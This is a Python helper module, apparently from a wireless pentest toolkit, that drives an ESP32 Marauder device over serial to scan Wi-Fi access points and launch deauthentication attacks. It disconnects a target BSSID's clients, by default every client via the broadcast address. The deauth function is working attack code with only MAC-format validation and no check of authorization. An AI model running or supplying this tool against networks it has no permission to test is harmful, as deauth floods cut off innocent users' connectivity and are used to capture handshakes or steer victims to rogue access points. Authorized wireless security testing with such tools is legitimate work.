"""ESP32 Marauder helper (serial CLI).

    python3 -m havokbox.helpers.marauder scan   --port P --seconds 20
    python3 -m havokbox.helpers.marauder deauth --port P --bssid AA:BB:CC:DD:EE:FF --channel 6 \
        [--client FF:FF:FF:FF:FF:FF] [--seconds 10]

`scan` and `deauth` take an injected session object so they are testable without hardware;
`main()` only parses args, builds a SerialSession, and prints one JSON object to stdout.
"""
from __future__ import annotations

import argparse
import json
import re
import sys

PROMPT = ""   # Marauder's shell has no single fixed prompt string worth matching on
BAUD = 115200
BROADCAST = "ff:ff:ff:ff:ff:ff"
_MAC_RE = re.compile(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
_AP_LINE = re.compile(
    r"^\s*\[(?P<idx>\d+)\]\s*\[CH:\s*(?P<ch>\d+)\]\s*(?P<ssid>.*?)\s+(?P<rssi>-?\d+)"
    r"(?:\s+(?P<bssid>([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}))?(?:\s*\(selected\))?\s*$"
)


def _is_mac(value: str) -> bool:
    return isinstance(value, str) and bool(_MAC_RE.match(value))


def parse_ap_list(text: str) -> list[dict]:
    """Tolerant parse of `list -a` lines, e.g. '[0][CH:6] MyNet -48' or with a trailing BSSID."""
    aps = []
    for line in text.splitlines():
        m = _AP_LINE.match(line)
        if not m:
            continue
        entry = {
            "index": int(m.group("idx")),
            "channel": int(m.group("ch")),
            "ssid": m.group("ssid").strip(),
            "rssi": int(m.group("rssi")),
        }
        if m.group("bssid"):
            entry["bssid"] = m.group("bssid")
        aps.append(entry)
        if len(aps) >= 64:
            break
    return aps


def scan(session, seconds: int) -> dict:
    session.send("scanap")
    session.read_for(seconds)
    session.send("stopscan")
    session.read_for(1)
    session.send("list -a")
    listing = session.read_for(3)
    return {"aps": parse_ap_list(listing)}


def deauth(session, bssid: str, channel: int, client: str, seconds: int) -> dict:
    if not _is_mac(bssid):
        return {"status": "refused", "reason": "invalid bssid"}
    client = client or BROADCAST
    if not _is_mac(client):
        return {"status": "refused", "reason": "invalid client mac"}

    session.send(f"channel -s {channel}")
    session.read_for(1)
    session.send(f"attack -t deauth -s {bssid} -d {client}")
    session.read_for(seconds)
    session.send("stopscan")
    session.read_for(1)
    return {"status": "sent", "bssid": bssid, "channel": int(channel), "client": client, "seconds": int(seconds)}


def stop(session) -> dict:
    """Safety: halt any running scan/attack (a killed deauth keeps transmitting until stopscan)."""
    session.send("stopscan")
    session.read_for(1)
    return {"status": "stopped"}


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="havokbox.helpers.marauder")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_scan = sub.add_parser("scan")
    p_scan.add_argument("--port", required=True)
    p_scan.add_argument("--seconds", type=int, required=True)

    p_stop = sub.add_parser("stop")
    p_stop.add_argument("--port", required=True)

    p_deauth = sub.add_parser("deauth")
    p_deauth.add_argument("--port", required=True)
    p_deauth.add_argument("--bssid", required=True)
    p_deauth.add_argument("--channel", type=int, required=True)
    p_deauth.add_argument("--client", default=BROADCAST)
    p_deauth.add_argument("--seconds", type=int, required=True)

    args = ap.parse_args(argv)

    if args.cmd == "deauth" and not (_is_mac(args.bssid) and _is_mac(args.client)):
        print(json.dumps({"status": "refused", "reason": "invalid MAC address"}))
        return 0

    try:
        from .serialcli import SerialSession
        session = SerialSession(args.port, BAUD, PROMPT)
        try:
            if args.cmd == "scan":
                result = scan(session, args.seconds)
            elif args.cmd == "stop":
                result = stop(session)
            else:
                result = deauth(session, args.bssid, args.channel, args.client, args.seconds)
        finally:
            session.close()
    except Exception as exc:  # noqa: BLE001 - always emit one JSON object, never crash
        result = {"status": "error", "error": str(exc)[:200]}

    print(json.dumps(result))
    return 0


if __name__ == "__main__":
    sys.exit(main())
